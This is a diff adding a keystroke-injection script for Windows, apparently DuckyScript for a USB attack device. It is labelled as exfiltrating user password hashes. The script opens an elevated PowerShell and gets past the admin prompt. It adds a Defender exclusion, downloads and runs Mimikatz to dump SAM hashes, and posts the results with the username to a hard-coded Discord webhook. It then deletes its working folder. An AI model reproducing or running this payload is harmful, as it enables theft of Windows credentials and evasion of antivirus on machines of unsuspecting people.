@@ -1,0 +1,67 @@
+REM ###################################################################
+REM #                                                                 #
+REM # Title        : Windows-User-Hash-Password-Exfiltration          #
+REM # Author       : Ricoland0                                        #
+REM # Description  : This script uses Mimikatz to extract Windows     #
+REM #                user password hashes and sends them to a Discord #
+REM #                webhook for exfiltration.                        #
+REM # Category     : Exfiltration                                     #
+REM # Target       : Windows                                          #
+REM # Version      : 1.0                                              #
+REM #                                                                 #
+REM ###################################################################
+
+GUI r
+DELAY 500  
+STRING powershell
+DELAY 250
+ENTER
+DELAY 1500 
+STRING Start-Process powershell -Verb runAs
+ENTER
+DELAY 500
+TAB
+TAB
+ENTER
+DELAY 1000  
+STRING Set-MpPreference -ExclusionPath "C:\Windows\System32\mimikatz"
+ENTER
+DELAY 500
+STRING New-Item -Name "mimikatz" -ItemType Directory
+ENTER
+DELAY 300  
+STRING Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile ".\mimikatz_trunk.zip"
+ENTER
+DELAY 5000  
+STRING Expand-Archive -Path ".\mimikatz_trunk.zip" -DestinationPath ".\mimikatz"
+ENTER
+DELAY 2000  
+STRING Remove-Item -Path ".\mimikatz_trunk.zip"
+ENTER
+DELAY 500 
+STRING Start-Process -FilePath ".\mimikatz\x64\mimikatz.exe"
+ENTER
+DELAY 1000
+STRING log "C:\Windows\System32\mimikatz\mimi.txt"
+ENTER
+DELAY 150
+STRING privilege::debug
+ENTER
+DELAY 150
+STRING lsadump::sam
+ENTER
+DELAY 150
+STRING log
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 1000
+STRING $hash = Get-Content -Path "C:\Windows\System32\mimikatz\mimi.txt"; $domain = $hash | Where-Object { $_ -match "Domain\s*:" }; $sysKey = $hash | Where-Object { $_ -match "SysKey\s*:" }; $username= $env:username; if ($domain.Count -eq 0 -or $sysKey.Count -eq 0) { $Body = @{ 'username' = "Erreur : Pas de données trouvées"; 'content'  = "Aucune donnée trouvée pour 'Domain :' ou 'SysKey'." } } else { $Body = @{ 'username' = "Hash win de $username"; 'content'  = ($domain -join "`n") + "`n" + ($sysKey -join "`n") } }; $webhookUrl = "https://discord.com/api/webhooks/1326669340954726462/aJLNY6uqtqLWG4ETe2jBi67BMTjr-sUw4flP-2F91EDy9bVC-doucOatKLC-aQR7UDbb"; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ContentType "application/json"
+ENTER
+DELAY 250
+STRING Remove-Item -Path "C:\Windows\System32\mimikatz"
+ENTER
+DELAY 500
+STRING t
+ENTER
